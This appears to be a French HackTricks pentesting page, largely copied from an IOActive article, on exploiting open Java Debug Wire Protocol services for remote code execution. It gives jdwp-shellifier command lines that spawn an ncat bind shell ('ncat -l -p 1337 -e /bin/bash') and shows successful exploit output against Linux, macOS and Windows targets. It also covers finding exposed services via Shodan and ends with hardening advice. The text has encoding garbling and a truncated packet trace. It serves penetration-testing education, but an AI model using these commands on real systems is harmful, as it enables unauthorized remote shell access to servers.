<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dÃ©pÃ´t hacktricks](https://github.com/carlospolop/hacktricks) et au [dÃ©pÃ´t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Exploitation

Vous pouvez utiliser l'exploit python situÃ© dans [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
J'ai constatÃ© que l'utilisation de `--break-on 'java.lang.String.indexOf'` rend l'exploit plus **stable**. Et si vous avez la possibilitÃ© de tÃ©lÃ©charger une porte dÃ©robÃ©e sur l'hÃ´te et de l'exÃ©cuter au lieu d'exÃ©cuter une commande, l'exploit sera encore plus stable.

Normalement, ce dÃ©bogueur est exÃ©cutÃ© sur le port 8000 et si vous Ã©tablissez une connexion TCP avec le port et envoyez "**JDWP-Handshake**", le serveur devrait vous rÃ©pondre avec la mÃªme chaÃ®ne.\
De plus, vous pouvez vÃ©rifier cette chaÃ®ne dans le rÃ©seau pour trouver d'Ã©ventuels services JDWP.

En listant les **processus**, si vous trouvez la chaÃ®ne "**jdwk**" Ã  l'intÃ©rieur d'un **processus java**, il a probablement activÃ© le **Java Debug Wired Protocol** et vous pourrez peut-Ãªtre vous dÃ©placer latÃ©ralement ou mÃªme **escalader les privilÃ¨ges** (si exÃ©cutÃ© en tant que root).

# Plus de dÃ©tails

**CopiÃ© depuis** [**https://ioactive.com/hacking-java-debug-wire-protocol-or-how/**](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)

## **Java Debug Wire Protocol**

**Java Platform Debug Architecture (JPDA)**: JDWP est un composant du systÃ¨me de dÃ©bogage Java global, appelÃ© Java Platform Debug Architecture (JPDA)\[2]. Voici un diagramme de l'architecture globale :

[![](https://ioactive.com/wp-content/uploads/2014/04/jdpa.png)](https://ioactive.com/wp-content/uploads/2014/04/jdpa-1.png)

Le Debuggee est constituÃ© d'une JVM multi-thread exÃ©cutant notre application cible. Pour Ãªtre dÃ©bogable Ã  distance, l'instance JVM doit Ãªtre explicitement dÃ©marrÃ©e avec l'option -Xdebug passÃ©e en ligne de commande, ainsi que l'option -Xrunjdwp (ou -agentlib). Par exemple, le dÃ©marrage d'un serveur Tomcat avec le dÃ©bogage Ã  distance activÃ© ressemblerait Ã  ceci :

[![](https://ioactive.com/wp-content/uploads/2014/04/tomat.png)](https://ioactive.com/wp-content/uploads/2014/04/tomat-1.png)

Comme le montre le diagramme d'architecture, le Java Debug Wire Protocol est le lien central entre le dÃ©bogueur et l'instance JVM. Les observations sur le protocole comprennent :

* C'est un protocole binaire de rÃ©seau basÃ© sur des paquets.
* Il est principalement synchrone. Le dÃ©bogueur envoie une commande sur JDWP et s'attend Ã  recevoir une rÃ©ponse. Cependant, certaines commandes, comme les Ã©vÃ©nements, n'attendent pas de rÃ©ponse synchrone. Ils enverront une rÃ©ponse lorsque des conditions spÃ©cifiques seront remplies. Par exemple, un point d'arrÃªt est un Ã©vÃ©nement.
* Il n'utilise pas d'authentification.
* Il n'utilise pas de chiffrement.

Toutes ces observations ont du sens puisque nous parlons d'un protocole de dÃ©bogage. Cependant, lorsque ce service est exposÃ© Ã  un rÃ©seau hostile, ou est accessible depuis Internet, les choses pourraient mal tourner.\
\
**Handshake**: JDWP dicte\[9] que la communication doit Ãªtre initiÃ©e par une simple poignÃ©e de main. AprÃ¨s une connexion TCP rÃ©ussie, le dÃ©bogueur (client) envoie la chaÃ®ne ASCII de 14 caractÃ¨res "JDWP-Handshake". Le Debuggee (serveur) rÃ©pond Ã  ce message en envoyant exactement la mÃªme chaÃ®ne. La trace scapy\[3] suivante montre la poignÃ©e de main initiale Ã  deux voies :

root:\~/tools/scapy-hg # ip addr show dev eth0 | grep â€œinet â€œ inet 192.168.2.2/24 brd 192.168.2.255 scope global eth0root:\~/tools/scapy-hg # ./run\_scapy

Welcome to Scapy (2.2.0-dev)\
**>>>** sniff(filter=â€tcp port 8000 and host 192.168.2.9â€³, count=8)\
\<Sniffed: TCP:9 UDP:1 ICMP:0 Other:0>\
**>>>** tcp.hexraw()\
0000 15:49:30.397814 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 S\
0001 15:49:30.402445 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 SA\
0002 15:49:30.402508 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 A\
0003 15:49:30.402601 Ether / IP / TCP 192.168.2.2:59079 > 192.168.2.9:8000 PA / Raw\
**0000 4A 44 57 50 2D 48 61 6E 64 73 68 61 6B 65 JDWP-Handshake**\
0004 15:49:30.407553 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0005 15:49:30.407557 Ether / IP / TCP 192.168.2.9:8000 > 192.168.2.2:59079 A\
0006 15:49:30.407557 Ether / IP / TCP 192.168
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.9 
[+] Targeting â€˜192.168.2.9:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) 64-Bit Server VM â€“ 1.6.0_65â€™
[+] Found Runtime class: id=466[+] Found Runtime.getRuntime(): id=7facdb6a8038
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™## Here we wait for breakpoint to be triggered by a new connection ##
[+] Received matching event from thread 0x8b0
[+] Found Operating System â€˜Mac OS Xâ€™
[+] Found User name â€˜pentestosxâ€™
[+] Found ClassPath â€˜/Users/pentestosx/Desktop/apache-tomcat-6.0.39/bin/bootstrap.jarâ€™
[+] Found User home directory â€˜/Users/pentestosxâ€™
[!] Command successfully executed
```
MÃªme ligne de commande, mais contre un systÃ¨me Windows et en arrÃªtant sur une mÃ©thode totalement diffÃ©rente:
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“break-on â€˜java.lang.String.indexOfâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜Java HotSpot(TM) Client VM â€“ 1.7.0_51â€™
[+] Found Runtime class: id=593
[+] Found Runtime.getRuntime(): id=17977a9c
[+] Created break event id=2
[+] Waiting for an event on â€˜java.lang.String.indexOfâ€™
[+] Received matching event from thread 0x8f5
[+] Found Operating System â€˜Windows 7â€™
[+] Found User name â€˜hugsyâ€™
[+] Found ClassPath â€˜C:UsershugsyDesktopapache-tomcat-6.0.39binbootstrap.jarâ€™
[+] Found User home directory â€˜C:Usershugsyâ€™
[!] Command successfully executed
```
Nous exÃ©cutons notre exploit pour crÃ©er un shell de liaison avec la charge utile "ncat -e /bin/bash -l -p 1337", contre un systÃ¨me Linux :
```
hugsy:~/labs % python2 jdwp-shellifier.py -t 192.168.2.8 â€“cmd â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Targeting â€˜192.168.2.8:8000â€™
[+] Reading settings for â€˜OpenJDK Client VM â€“ 1.6.0_27â€™
[+] Found Runtime class: id=79d
[+] Found Runtime.getRuntime(): id=8a1f5e0
[+] Created break event id=2
[+] Waiting for an event on â€˜java.net.ServerSocket.acceptâ€™
[+] Received matching event from thread 0x82a[+] Selected payload â€˜ncat -l -p 1337 -e /bin/bashâ€™
[+] Command string object created id:82b
[+] Runtime.getRuntime() returned context id:0x82c
[+] found Runtime.exec(): id=8a1f5fc[+] Runtime.exec() successful, retId=82d
[!] Command successfully executed Success, we now have a listening socket!
root@pwnbox:~/apache-tomcat-6.0.39# netstat -ntpl | grep 1337
tcp        0      0 0.0.0.0:1337         0.0.0.0:*               LISTEN      19242/ncat      
tcp6       0      0 :::1337              :::*                    LISTEN      19242/ncat     
```
L'exploit final utilise ces techniques, ajoute quelques vÃ©rifications et envoie des signaux de suspension/reprise pour causer le moins de perturbation possible (il est toujours prÃ©fÃ©rable de ne pas casser l'application sur laquelle vous travaillez, n'est-ce pas ?). Il agit en deux modes :

* Le mode "par dÃ©faut" est totalement non intrusif et exÃ©cute simplement du code Java pour obtenir des informations systÃ¨me locales (parfait pour une preuve de concept Ã  un client).
* Le passage de l'option "cmd" exÃ©cute une commande systÃ¨me sur l'hÃ´te distant et est donc plus intrusif. La commande est exÃ©cutÃ©e avec les privilÃ¨ges avec lesquels la JVM s'exÃ©cute.

Ce script d'exploitation a Ã©tÃ© testÃ© avec succÃ¨s contre :

* Oracle Java JDK 1.6 et 1.7
* OpenJDK 1.6
* IBM JDK 1.6

Comme Java est conÃ§u pour Ãªtre indÃ©pendant de la plate-forme, des commandes peuvent Ãªtre exÃ©cutÃ©es sur n'importe quel systÃ¨me d'exploitation pris en charge par Java. Eh bien, c'est en fait une bonne nouvelle pour nous, les testeurs de pÃ©nÃ©tration : un service JDWP ouvert signifie une RCE fiable. Jusqu'Ã  prÃ©sent, tout va bien.

## **Et en ce qui concerne l'exploitation en temps rÃ©el ?**

En fait, JDWP est assez souvent utilisÃ© dans le monde des applications Java. Les testeurs de pÃ©nÃ©tration pourraient cependant ne pas le voir souvent lorsqu'ils effectuent des Ã©valuations Ã  distance car les pare-feu bloqueraient (et devraient) principalement le port sur lequel il s'exÃ©cute. Mais cela ne signifie pas que JDWP ne peut pas Ãªtre trouvÃ© dans la nature :

* Au moment de la rÃ©daction de cet article, une recherche rapide sur ShodanHQ\[4] rÃ©vÃ¨le immÃ©diatement environ 40 serveurs envoyant la poignÃ©e de main JDWP :

![](https://ioactive.com/wp-content/uploads/2014/04/shodan.png)

C'est en fait une dÃ©couverte intÃ©ressante car, comme nous l'avons vu prÃ©cÃ©demment, c'est censÃ© Ãªtre le cÃ´tÃ© client (dÃ©bogueur) qui initie le dialogue.

* GitHub\[7] rÃ©vÃ¨le Ã©galement un nombre significatif d'applications open source potentiellement vulnÃ©rables :

![](https://ioactive.com/wp-content/uploads/2014/04/github.png)

* La recherche de ports spÃ©cifiques (tcp/8000, tcp/8080, tcp/8787, tcp/5005) sur Internet a rÃ©vÃ©lÃ© de nombreux hÃ´tes (qui ne peuvent pas Ãªtre signalÃ©s ici) rÃ©pondant Ã  la poignÃ©e de main initiale.
* Des applications "entreprise" ont Ã©tÃ© trouvÃ©es dans la nature exÃ©cutant un service JDWP \*par dÃ©faut\* (la recherche du numÃ©ro de port rÃ©el est laissÃ©e Ã  l'exercice du lecteur curieux).

Ce ne sont que quelques faÃ§ons de dÃ©couvrir des services JDWP ouverts sur Internet. C'est un excellent rappel que les applications devraient rÃ©guliÃ¨rement faire l'objet d'examens de sÃ©curitÃ© approfondis, que les environnements de production devraient avoir toute fonctionnalitÃ© de dÃ©bogage dÃ©sactivÃ©e et que les pare-feu devraient Ãªtre configurÃ©s pour restreindre l'accÃ¨s aux services nÃ©cessaires uniquement pour un fonctionnement normal. Permettre Ã  n'importe qui de se connecter Ã  un service JDWP, c'est exactement la mÃªme chose que permettre une connexion Ã  un service gdbserver (de maniÃ¨re peut-Ãªtre plus stable). J'espÃ¨re que vous avez apprÃ©ciÃ© la lecture de cet article autant que j'ai apprÃ©ciÃ© jouer avec JDWP. Ã€ tous les pirates puissants, joyeux JDWP pwning !!

**Remerciements**\
\
Je tiens Ã  remercier Ilja Van Sprundel et Sebastien Macke pour leurs idÃ©es et leurs tests.

## **RÃ©fÃ©rences :**

1. [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
2. [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
3. http://www.secdev.org/projects/scapy(no longer active)
4. [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
5. http://www.hsc-news.com/archives/2013/000109.html (no longer active)
6. [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
7. https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
8. [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
9. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
10. [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
11. [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au repo [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
